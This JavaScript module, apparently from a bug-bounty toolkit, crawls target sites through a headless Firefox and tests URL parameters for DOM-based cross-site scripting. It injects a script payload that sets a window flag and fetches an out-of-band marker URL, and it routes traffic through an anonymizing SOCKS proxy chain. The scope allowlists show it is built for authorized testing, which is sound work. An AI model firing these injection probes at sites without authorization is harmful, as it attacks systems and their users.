// VARVEL — browseragent: ghost-proxied crawl + DOM-XSS canary (Tool 4).
//
// A headless-browser crawler for bug-bounty targets: visit pages, collect
// links / forms / XHRs, same-origin only, confined by a scope-host allowlist and
// path prefixes — cross-origin links are recorded as refusals, NEVER queued.
// Real-browser access is behind an INJECTABLE driver interface (tests run a
// fake); the playwright-core Firefox factory below is the .tmp/fe-harvest.mjs
// pattern productized (persistent profile, headless:false, proxy pinned to the
// ghost chain socks5://10.64.0.1:1080).
//
// THE DOM-XSS ORACLE: a reflected/DOM sink only graduates to 'proven' when the
// canary EXECUTES — page JS runs the unique payload, which sets
// window.__varvelCanary = '<id>' (read back by the driver) and, when a marker
// URL is provided, fetches the marker (correlated out-of-band, oob-style). A
// reflection without execution is an 'unproven' probe and emits ZERO findings —
// screenshot + console log are captured as evidence ONLY on proven hits.
//
// GOVERNANCE: the driver rides the ghost chain (the factory pins the proxy);
// scopeHosts / pathPrefixes confine every navigation; budget {maxRequests,
// maxMs} stops honestly ('budget.exhausted' via onLog). Never throws.
//
// CAPS: BROWSER_CAPS.
//
// usage:
//   const driver = await playwrightDriverFactory({ profileDir: '.tmp/ff-crawl' });
//   const g = await crawl('https://target.example/', { driver, scopeHosts: ['target.example'], budget, onLog });
//   const x = await domXssCanary('https://target.example/search', { params: ['q'], driver, markerUrl: oob.localUrl() + '/m', markerHit: (id) => oob.correlate(id).hit });

// ——— the driver interface (injectable — tests run a fake) ———
//   goto(url)        → { ok, url, status?, links: [href], forms: [{ action, method, inputs: [name] }], xhrs: [url] }
//   evalJs(expr)     → value | null            (canary readback)
//   consoleLogs()    → [string]
//   screenshot?(tag) → path | null             (evidence hook)
//   close()          → void

import { pathPrefixAllowed } from '../engine/scopepath.mjs';

export const BROWSER_CAPS = { maxPages: 20, maxDepth: 2, maxLinksPerPage: 50, maxParams: 8, bodySnippet: 400 };

const logTo = (onLog, obj) => { if (typeof onLog === 'function') { try { onLog(obj); } catch { /* observer never breaks the crawl */ } } };

function makeBudget(budget, onLog) {
  const b = { maxRequests: Number.isFinite(budget && budget.maxRequests) ? budget.maxRequests : Infinity, maxMs: Number.isFinite(budget && budget.maxMs) ? budget.maxMs : Infinity, used: 0, t0: Date.now() };
  return {
    spend(what) {
      const elapsed = Date.now() - b.t0;
      if (b.used >= b.maxRequests || elapsed >= b.maxMs) {
        logTo(onLog, { type: 'budget.exhausted', tool: 'browseragent', what, used: b.used, maxRequests: b.maxRequests, elapsedMs: elapsed, maxMs: b.maxMs });
        return false;
      }
      b.used += 1;
      return true;
    },
    state: () => ({ used: b.used, maxRequests: b.maxRequests, elapsedMs: Date.now() - b.t0, maxMs: b.maxMs }),
  };
}

// scope confinement — exact host or a listed parent suffix; fail-closed when an
// allowlist is present and the host is outside it.
export function scopeHostAllowed(host, scopeHosts) {
  if (!Array.isArray(scopeHosts) || !scopeHosts.length) return true; // no allowlist = no host constraint (lab default)
  const h = String(host || '').toLowerCase();
  return scopeHosts.some((s) => { const x = String(s).toLowerCase(); return h === x || h.endsWith('.' + x); });
}

// ——— the crawl graph ———
// crawl(startUrl, { driver, scopeHosts, pathPrefixes, maxDepth, maxPages,
//   budget, onLog }) → { ok, start, pages, edges, forms, xhrs, refusals, budget }
// BFS, same-origin + allowlist confined, prefix-confined, deduped, capped.
// NEVER throws.
export async function crawl(startUrl, { driver, scopeHosts = null, pathPrefixes = null, maxDepth = BROWSER_CAPS.maxDepth, maxPages = BROWSER_CAPS.maxPages, budget = null, onLog = null } = {}) {
  const refusals = [], pages = [], edges = [], forms = [], xhrs = [];
  const bd = makeBudget(budget, onLog);
  const done = (extra = {}) => ({ start: String(startUrl), pages, edges, forms, xhrs, refusals, budget: bd.state(), ...extra });
  if (!driver || typeof driver.goto !== 'function') return done({ ok: false, error: 'a browser driver implementing the driver interface is required' });
  let start;
  try { start = new URL(startUrl); } catch { return done({ ok: false, error: 'unparseable start URL' }); }
  if (!scopeHostAllowed(start.hostname, scopeHosts)) {
    refusals.push({ url: startUrl, reason: 'out-of-scope-host' });
    return done({ ok: false, error: 'start URL outside the scope allowlist — refused before the wire' });
  }

  const visited = new Set();
  const queue = [{ url: start.href, depth: 0 }];
  try {
    while (queue.length && pages.length < maxPages) {
      const { url, depth } = queue.shift();
      if (visited.has(url)) continue;
      visited.add(url);
      if (!bd.spend('goto:' + url)) { logTo(onLog, { type: 'crawl.budget-stop', url }); break; }
      const res = await driver.goto(url);
      if (!res || res.ok === false) { pages.push({ url, depth, ok: false, error: (res && res.error) || 'navigation failed' }); continue; }
      const links = (Array.isArray(res.links) ? res.links : []).slice(0, BROWSER_CAPS.maxLinksPerPage);
      const pageForms = (Array.isArray(res.forms) ? res.forms : []).map((f) => ({ page: url, action: f.action || null, method: String(f.method || 'GET').toUpperCase(), inputs: (f.inputs || []).slice(0, 20) }));
      const pageXhrs = (Array.isArray(res.xhrs) ? res.xhrs : []).slice(0, BROWSER_CAPS.maxLinksPerPage);
      pages.push({ url, depth, ok: true, status: res.status ?? null, links: links.length, forms: pageForms.length, xhrs: pageXhrs.length });
      forms.push(...pageForms);
      xhrs.push(...pageXhrs.map((x) => ({ page: url, url: x })));

      for (const href of links) {
        let next;
        try { next = new URL(href, url); next.hash = ''; } catch { continue; }
        if (!/^https?:$/.test(next.protocol)) continue; // javascript:/mailto: never queue
        // scope confinement — cross-origin links are REFUSALS, never queued
        if (next.hostname !== start.hostname && !scopeHostAllowed(next.hostname, scopeHosts)) {
          refusals.push({ url: next.href, from: url, reason: 'cross-origin' });
          continue;
        }
        if (!scopeHostAllowed(next.hostname, scopeHosts)) {
          refusals.push({ url: next.href, from: url, reason: 'out-of-scope-host' });
          continue;
        }
        if (pathPrefixes && !pathPrefixAllowed(next.pathname, pathPrefixes)) {
          refusals.push({ url: next.href, from: url, reason: 'out-of-scope-path' });
          continue;
        }
        edges.push({ from: url, to: next.href });
        if (depth + 1 <= maxDepth && !visited.has(next.href)) queue.push({ url: next.href, depth: depth + 1 });
      }
    }
  } catch (e) {
    return done({ ok: false, error: 'crawl driver exception (honest): ' + String((e && e.message) || e) });
  }
  logTo(onLog, { type: 'crawl.done', start: start.href, pages: pages.length, edges: edges.length, forms: forms.length, xhrs: xhrs.length, refusals: refusals.length });
  return done({ ok: true });
}

// ——— the DOM-XSS canary ———
// domXssCanary(baseUrl, { params, driver, markerUrl, markerHit, payloadTpl,
//   scopeHosts, pathPrefixes, budget, onLog })
// For each reflected parameter: navigate with a unique canary payload
//   "><script>window.__varvelCanary="<id>";fetch("<markerUrl>?c=<id>")</script>
// verdict 'proven' ONLY when the driver reads window.__varvelCanary === <id>
// (in-page execution) OR markerHit(<id>) correlates (out-of-band execution).
// A reflection that never executes is 'unproven' and emits NO finding.
export async function domXssCanary(baseUrl, { params = [], driver, markerUrl = null, markerHit = null, payloadTpl = null, scopeHosts = null, pathPrefixes = null, budget = null, onLog = null } = {}) {
  const { randomBytes } = await import('node:crypto');
  const refusals = [], probes = [], findings = [];
  const bd = makeBudget(budget, onLog);
  const done = (extra = {}) => ({ base: String(baseUrl), findings, probes, refusals, budget: bd.state(), ...extra });
  if (!driver || typeof driver.goto !== 'function') return done({ ok: false, error: 'a browser driver implementing the driver interface is required' });
  let base;
  try { base = new URL(baseUrl); } catch { return done({ ok: false, error: 'unparseable base URL' }); }
  if (!scopeHostAllowed(base.hostname, scopeHosts)) {
    refusals.push({ url: baseUrl, reason: 'out-of-scope-host' });
    return done({ ok: false, error: 'base URL outside the scope allowlist — refused before the wire' });
  }
  if (pathPrefixes && !pathPrefixAllowed(base.pathname, pathPrefixes)) {
    refusals.push({ path: base.pathname, reason: 'out-of-scope-path' });
    return done({ ok: false, error: 'base path outside the signed path prefixes — refused before the wire' });
  }

  try {
    for (const param of (params || []).slice(0, BROWSER_CAPS.maxParams)) {
      const id = 'vx' + randomBytes(6).toString('hex'); // unique per probe — attribution is exact
      const payload = payloadTpl
        ? payloadTpl.replaceAll('{ID}', id).replaceAll('{MARKER}', markerUrl || '')
        : `"><script>window.__varvelCanary="${id}";${markerUrl ? `fetch("${markerUrl}?c=${id}").catch(()=>{});` : ''}</script>`;
      const u = new URL(base.href);
      u.searchParams.set(param, payload);
      const probe = { param, canary: id, url: u.href, verdict: 'unproven', executedBy: null };
      probes.push(probe);
      if (!bd.spend('canary:' + param)) { probe.note = 'budget exhausted — probe not fired'; break; }
      const nav = await driver.goto(u.href);
      if (!nav || nav.ok === false) { probe.note = 'navigation failed'; continue; }

      // the oracle: execution, not reflection
      let markerSeen = false;
      if (!probe.executedBy && typeof markerHit === 'function') {
        try { markerSeen = !!(await markerHit(id)); } catch { markerSeen = false; }
      }
      if (markerSeen) probe.executedBy = 'marker-callback';
      if (!probe.executedBy && typeof driver.evalJs === 'function') {
        let v = null;
        try { v = await driver.evalJs('window.__varvelCanary'); } catch { v = null; }
        if (v === id) probe.executedBy = 'window.__varvelCanary';
      }
      if (probe.executedBy) {
        probe.verdict = 'proven';
        findings.push({
          param, verdict: 'proven', canary: id, executedBy: probe.executedBy,
          detail: `the canary payload for parameter '${param}' EXECUTED in page context (signal: ${probe.executedBy}) — reflection alone would have left the window flag unset`,
          url: u.href, payload,
          screenshot: typeof driver.screenshot === 'function' ? await driver.screenshot(`domxss-${param}-${id}`).catch(() => null) : null,
          console: typeof driver.consoleLogs === 'function' ? driver.consoleLogs().slice(0, 20) : [],
        });
        logTo(onLog, { type: 'domxss.proven', param, canary: id, executedBy: probe.executedBy });
      } else {
        logTo(onLog, { type: 'domxss.unproven', param, canary: id });
      }
    }
  } catch (e) {
    return done({ ok: false, error: 'canary driver exception (honest): ' + String((e && e.message) || e) });
  }
  return done({ ok: true });
}

// ——— the real driver: playwright-core Firefox, ghost-proxied ———
// The .tmp/fe-harvest.mjs pattern productized. Lazy import — the module loads
// zero-dep; playwright is only touched for a real browser. MANUAL smoke only
// (needs a Firefox binary + the chain up); tests use a fake driver.
export async function playwrightDriverFactory({ profileDir, proxy = 'socks5://10.64.0.1:1080', headless = false, extraHTTPHeaders = null, onLog = null } = {}) {
  const { firefox } = await import('playwright-core');
  const ctx = await firefox.launchPersistentContext(profileDir, {
    headless,
    proxy: proxy ? { server: proxy } : undefined,
    extraHTTPHeaders: extraHTTPHeaders || undefined,
    viewport: { width: 1280, height: 900 },
  });
  const page = ctx.pages()[0] || (await ctx.newPage());
  const consoleBuf = [];
  page.on('console', (m) => { if (consoleBuf.length < 100) consoleBuf.push(`[${m.type()}] ${m.text().slice(0, 300)}`); });
  let pendingXhrs = [];
  page.on('response', (r) => {
    if (['xhr', 'fetch'].includes(r.request().resourceType()) && pendingXhrs.length < BROWSER_CAPS.maxLinksPerPage) {
      pendingXhrs.push(r.url());
    }
  });
  return {
    async goto(url) {
      pendingXhrs = [];
      try {
        const res = await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 60000 });
        await page.waitForTimeout(3000);
        // shadow-DOM tolerant: node-side selectors pierce shadow roots
        const links = await page.$$eval('a[href]', (as) => as.map((a) => a.getAttribute('href')).filter(Boolean)).catch(() => []);
        const forms = await page.$$eval('form', (fs) => fs.map((f) => ({ action: f.getAttribute('action'), method: f.getAttribute('method') || 'GET', inputs: [...f.querySelectorAll('input,textarea,select')].map((i) => i.name || i.id || i.type).filter(Boolean) }))).catch(() => []);
        return { ok: true, url: page.url(), status: res ? res.status() : null, links, forms, xhrs: pendingXhrs.slice() };
      } catch (e) {
        return { ok: false, url, error: String((e && e.message) || e), links: [], forms: [], xhrs: [] };
      }
    },
    async evalJs(expr) {
      try { return await page.evaluate(expr); } catch { return null; }
    },
    consoleLogs() { return consoleBuf.slice(); },
    async screenshot(tag) {
      try { const p = `${profileDir}/browseragent-${tag}.png`; await page.screenshot({ path: p }); return p; } catch { return null; }
    },
    async close() { try { await ctx.close(); } catch { /* best-effort */ } },
  };
}
